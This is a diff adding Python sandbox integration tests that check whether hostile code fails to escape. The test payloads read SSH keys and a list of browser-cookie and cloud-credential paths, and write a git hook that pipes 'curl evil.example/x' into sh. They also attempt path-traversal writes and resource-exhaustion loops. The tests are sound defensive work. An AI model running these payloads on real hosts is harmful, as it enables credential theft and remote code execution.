@@ -17,6 +17,7 @@ import subprocess
 import tempfile
 import time
 from pathlib import Path
+from unittest import mock
 
 from scripts.sandbox.boundary import Outcome, SandboxLimits
 from tests.integration.sandbox._harness import PRIMITIVES, SandboxIntegrationCase
@@ -93,6 +94,44 @@ class CredentialAccessTests(SandboxIntegrationCase):
         finally:
             del os.environ["GITHUB_TOKEN"]
 
+    def test_sbox_004_root_home_directory_is_unreadable(self) -> None:
+        code = (
+            "print(open('/root/.ssh/id_rsa').read())\n"
+            "print('PAYLOAD-SUCCEEDED')\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+
+    def test_sbox_004_browser_and_session_credential_stores_are_unreadable(self) -> None:
+        # Real on-host paths a compromised validation command would try
+        # first for cookie jars, saved sessions, and CLI-tool tokens.
+        candidates = (
+            "~/.netrc",
+            "~/.aws/credentials",
+            "~/.config/gh/hosts.yml",
+            "~/Library/Application Support/Google/Chrome/Default/Cookies",
+            "~/.mozilla/firefox/profiles.ini",
+            "~/Library/Cookies/Cookies.binarycookies",
+            "~/.config/google-chrome/Default/Cookies",
+        )
+        code = (
+            "import os\n"
+            f"for rel in {candidates!r}:\n"
+            "    path = os.path.expanduser(rel)\n"
+            "    try:\n"
+            "        data = open(path, 'rb').read()\n"
+            "    except OSError:\n"
+            "        continue\n"
+            "    if data:\n"
+            "        print('PAYLOAD-SUCCEEDED')\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+
 
 class FilesystemBoundaryTests(SandboxIntegrationCase):
     """SBOX-005, SBOX-006, SBOX-007: host paths, source writes, .git mutation."""
@@ -145,6 +184,49 @@ class FilesystemBoundaryTests(SandboxIntegrationCase):
                 result = self.run_python(primitive, code)
                 self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
         self.assertEqual(original_git_config.read_text(), "[core]\n")
+
+    def test_sbox_007_git_hooks_mutation_never_reaches_the_original_git_dir(self) -> None:
+        hooks_dir = self.source_dir / ".git" / "hooks"
+        hooks_dir.mkdir(parents=True, exist_ok=True)
+        original_hook = hooks_dir / "post-checkout"
+        original_hook.write_text("#!/bin/sh\n")
+        code = (
+            f"open('{original_hook}', 'w').write('#!/bin/sh\\ncurl evil.example/x | sh\\n')\n"
+            "print('PAYLOAD-SUCCEEDED')\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+        self.assertEqual(original_hook.read_text(), "#!/bin/sh\n")
+
+    def test_sbox_005_host_absolute_path_write_is_denied(self) -> None:
+        outside = Path(tempfile.mkdtemp(prefix="crs-host-write-target-"))
+        target = outside / "canary.txt"
+        try:
+            code = f"open('{target}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
+            for primitive in PRIMITIVES:
+                with self.subTest(primitive=primitive):
+                    result = self.run_python(primitive, code)
+                    self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+            self.assertFalse(target.exists(), "hostile write reached a host path outside the workspace")
+        finally:
+            shutil.rmtree(outside, ignore_errors=True)
+
+    def test_sbox_005_path_traversal_write_does_not_escape_the_workspace(self) -> None:
+        marker_name = "traversal-canary.txt"
+        # Enough "../" segments to clear any plausible workspace nesting
+        # depth and land back in the real filesystem root if unconfined.
+        traversal = "/".join([".."] * 12 + [marker_name])
+        code = f"open('{traversal}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+        # The canary must not have landed anywhere reachable on the real
+        # host filesystem root or the reviewed source tree's parent.
+        self.assertFalse((Path("/") / marker_name).exists())
+        self.assertFalse((self.source_dir.parent / marker_name).exists())
 
 
 class ExternalWriteApiTests(SandboxIntegrationCase):
@@ -200,6 +282,30 @@ class ResourceExhaustionTests(SandboxIntegrationCase):
                 result = self.run_python(primitive, code, limits=limits)
                 self.assertEqual(result.outcome, Outcome.FAILED)
 
+    def test_sbox_010_cpu_budget_terminates_a_busy_loop(self) -> None:
+        # A tight, syscall-free busy loop only a CPU-time (not wall-clock)
+        # ceiling can be relied on to bound for the Seatbelt/bwrap
+        # primitives; the generous wall-clock ceiling here is a backstop,
+        # never the mechanism under test.
+        code = "x = 0\nwhile True:\n    x += 1\n"
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                limits = SandboxLimits(wall_clock_seconds=25, cpu_seconds=2)
+                result = self.run_python(primitive, code, limits=limits)
+                self.assertEqual(result.outcome, Outcome.FAILED)
+
+    def test_sbox_010_memory_budget_terminates_an_allocation_bomb(self) -> None:
+        code = (
+            "chunks = []\n"
+            "while True:\n"
+            "    chunks.append(bytearray(10 * 1024 * 1024))\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                limits = SandboxLimits(wall_clock_seconds=20, memory_bytes=150 * 1024 * 1024)
+                result = self.run_python(primitive, code, limits=limits)
+                self.assertEqual(result.outcome, Outcome.FAILED)
+
 
 class PersistenceTests(SandboxIntegrationCase):
     """SBOX-011: nothing survives teardown."""
@@ -219,6 +325,35 @@ class PersistenceTests(SandboxIntegrationCase):
                 self.assertEqual(
                     _matching_host_processes(marker_name), [],
                     "background descendant survived sandbox teardown",
+                )
+
+    def test_sbox_011_generated_artifacts_and_caches_do_not_persist_on_the_host(self) -> None:
+        from scripts.sandbox import runner as runner_module
+        from scripts.sandbox.workspace import prepare_workspace as real_prepare_workspace
+
+        code = (
+            "import os\n"
+            "os.makedirs('.cache', exist_ok=True)\n"
+            "open('generated-artifact.bin', 'wb').write(b'0' * 1024)\n"
+            "open('.cache/entry.tmp', 'wb').write(b'0' * 1024)\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                captured_roots: list[Path] = []
+
+                def _spying_prepare_workspace(source_dir):
+                    workspace = real_prepare_workspace(source_dir)
+                    captured_roots.append(workspace.root)
+                    return workspace
+
+                with mock.patch.object(
+                    runner_module, "prepare_workspace", side_effect=_spying_prepare_workspace
+                ):
+                    self.run_python(primitive, code, limits=SandboxLimits(wall_clock_seconds=10))
+                self.assertEqual(len(captured_roots), 1)
+                self.assertFalse(
+                    captured_roots[0].exists(),
+                    "disposable sandbox workspace (generated artifacts/caches) survived teardown",
                 )
 
 
